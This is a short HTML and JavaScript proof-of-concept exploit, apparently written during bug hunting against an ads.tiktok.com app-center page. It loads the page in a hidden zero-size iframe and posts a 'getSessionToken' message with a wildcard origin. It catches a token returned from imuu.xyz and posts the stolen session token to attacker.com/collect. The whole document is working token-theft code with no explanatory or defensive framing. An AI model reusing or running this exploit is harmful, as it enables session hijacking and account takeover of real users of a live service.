<iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>

<script>
    const targetOrigin = "https://imuu.xyz"; // frame[0].frames[0]'s origin you spotted earlier

    document.getElementById('victim').onload = function() {
        const victimWindow = this.contentWindow;

        // Use try-catch to probe deeper cross-origin access limits
        try {
            // Instead of accessing victimWindow.frames[0], 
            // let's try to "blindly" send the message downward via "*"
            victimWindow.postMessage({ action: "getSessionToken" }, "*");
        } catch (e) {
            console.warn("Direct postMessage failed:", e);
        }
    };

    // Capture token coming back from imuu.xyz
    window.addEventListener('message', (e) => {
        if (e.origin === targetOrigin && e.data && e.data.token) {
            console.log("ðŸŽ¯ GOT SESSION TOKEN:", e.data);

            fetch('https://attacker.com/collect', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ token: e.data })
            });
        }
    });
</script>
